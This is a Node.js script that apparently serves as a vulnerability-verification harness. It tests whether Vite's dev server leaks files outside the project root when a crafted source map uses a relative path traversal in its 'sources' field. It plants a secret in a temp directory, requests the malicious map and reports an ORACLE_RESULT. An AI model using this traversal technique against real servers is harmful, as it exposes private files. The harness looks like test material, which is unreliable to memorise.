const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';
  let server;

  const marker = 'vite-map-traversal-' + Date.now() + '-' + Math.random().toString(16).slice(2);
  const base = path.join(os.tmpdir(), marker);
  const root = path.join(base, 'project');
  const depsDir = path.join(root, 'node_modules', '.vite', 'deps');

  try {
    fs.mkdirSync(depsDir, { recursive: true });
    fs.writeFileSync(path.join(root, 'index.html'), '<!doctype html><html><body>ok</body></html>');

    const insideSource = 'inside-source.ts';
    const benignMapName = 'benign.js.map';
    const benignObj = {
      version: 3,
      file: 'benign.js',
      sources: [insideSource],
      names: [],
      mappings: 'AAAA'
    };
    fs.writeFileSync(path.join(depsDir, insideSource), 'export const inside = "' + marker + '";');
    fs.writeFileSync(path.join(depsDir, benignMapName), JSON.stringify(benignObj));

    const secretValue = 'TOP_SECRET_' + marker;
    const secretPath = path.join(base, 'outside-secret.txt');
    fs.writeFileSync(secretPath, secretValue);

    const maliciousMapName = 'malicious.js.map';
    const traversal = path.relative(depsDir, secretPath).split(path.sep).join('/');
    const maliciousObj = {
      version: 3,
      file: 'malicious.js',
      sources: [traversal],
      names: [],
      mappings: 'AAAA'
    };
    fs.writeFileSync(path.join(depsDir, maliciousMapName), JSON.stringify(maliciousObj));

    const vite = require('vite');
    if (!vite || typeof vite.createServer !== 'function') {
      throw new Error('vite.createServer unavailable');
    }

    server = await vite.createServer({
      root,
      logLevel: 'silent',
      appType: 'custom',
      server: { middlewareMode: true },
      optimizeDeps: { noDiscovery: true, force: false }
    });

    const request = (url) => new Promise((resolve, reject) => {
      const req = { method: 'GET', url, headers: {} };
      const res = {
        statusCode: 200,
        headers: {},
        body: '',
        writableEnded: false,
        setHeader(k, v) { this.headers[String(k).toLowerCase()] = v; },
        getHeader(k) { return this.headers[String(k).toLowerCase()]; },
        removeHeader(k) { delete this.headers[String(k).toLowerCase()]; },
        hasHeader(k) { return Object.prototype.hasOwnProperty.call(this.headers, String(k).toLowerCase()); },
        writeHead(code, headers) {
          this.statusCode = code;
          if (headers && typeof headers === 'object') {
            for (const key of Object.keys(headers)) this.setHeader(key, headers[key]);
          }
          return this;
        },
        write(chunk) { if (chunk != null) this.body += String(chunk); return true; },
        end(chunk) {
          if (chunk != null) this.body += String(chunk);
          this.writableEnded = true;
          resolve({ statusCode: this.statusCode || 200, headers: this.headers, body: this.body });
        }
      };

      try {
        server.middlewares(req, res, () => {
          if (!res.writableEnded) {
            resolve({ statusCode: res.statusCode || 404, headers: res.headers, body: res.body || '' });
          }
        });
      } catch (e) {
        reject(e);
      }
    });

    const benignResp = await request('/node_modules/.vite/deps/' + benignMapName);
    const benignBody = String((benignResp && benignResp.body) || '');
    const benignStatus = benignResp ? benignResp.statusCode : 0;

    let benignJson;
    try {
      benignJson = JSON.parse(benignBody);
    } catch (e) {
      benignJson = null;
    }

    const benignOk = benignStatus >= 200 && benignStatus < 300 && benignJson && Array.isArray(benignJson.sources) && benignJson.sources.length > 0;
    if (!benignOk) {
      throw new Error('benign failed: status=' + benignStatus + ' body=' + benignBody.slice(0, 200));
    }

    operation_completed = true;

    let malResp;
    let malErr;
    try {
      malResp = await request('/node_modules/.vite/deps/' + maliciousMapName);
    } catch (e) {
      malErr = e;
    }

    if (malErr) {
      exploit_succeeded = false;
      evidence = 'blocked_by_exception=' + (malErr && malErr.message ? malErr.message : String(malErr));
    } else {
      const malBody = String((malResp && malResp.body) || '');
      let malJson;
      try {
        malJson = JSON.parse(malBody);
      } catch (e) {
        malJson = null;
      }

      let leaked = false;
      if (malJson && Array.isArray(malJson.sourcesContent)) {
        for (const item of malJson.sourcesContent) {
          if (typeof item === 'string' && item.includes(secretValue)) {
            leaked = true;
            break;
          }
        }
      }
      if (!leaked && malBody.includes(secretValue)) leaked = true;

      exploit_succeeded = leaked;
      evidence = 'benign_status=' + benignStatus + ',mal_status=' + (malResp ? malResp.statusCode : 0) + ',mal_len=' + malBody.length + ',leak=' + leaked;
    }
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_failure=' + (err && err.message ? err.message : String(err));
  } finally {
    try { if (server) await server.close(); } catch (_) {}
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();